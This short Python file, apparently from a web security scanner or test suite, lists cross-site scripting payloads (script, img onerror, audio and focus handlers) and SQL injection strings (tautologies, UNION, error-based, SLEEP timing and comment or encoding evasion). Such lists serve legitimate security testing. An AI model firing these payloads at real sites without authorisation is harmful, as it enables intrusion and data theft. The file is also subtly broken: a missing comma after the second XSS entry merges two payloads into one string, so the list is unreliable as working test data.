XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>"
    '<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    "<audio src/onerror=alert(1)>",
    "<a id=x tabindex=1 onfocus=alert(1)></a>"
]

SQLI_PAYLOADS = [

    "' OR 1=1 -- ",
    '" OR "a"="a',
    "1 OR 1=1",  


    "' UNION SELECT 1,2,3-- ",
    "' AND 1=CONVERT(int, (SELECT @@version))-- ",


    "' OR 1234=SLEEP(5) -- ",


    "'%0AOR%0A1=1 -- ",
    "'/**/OR/**/1=1 -- ",
    "1'||(SELECT 1 FROM users WHERE 1=1)||'",


    "' UNION SELECT 'a',sqlite_version(),3 -- ",
    "admin'-- "
]
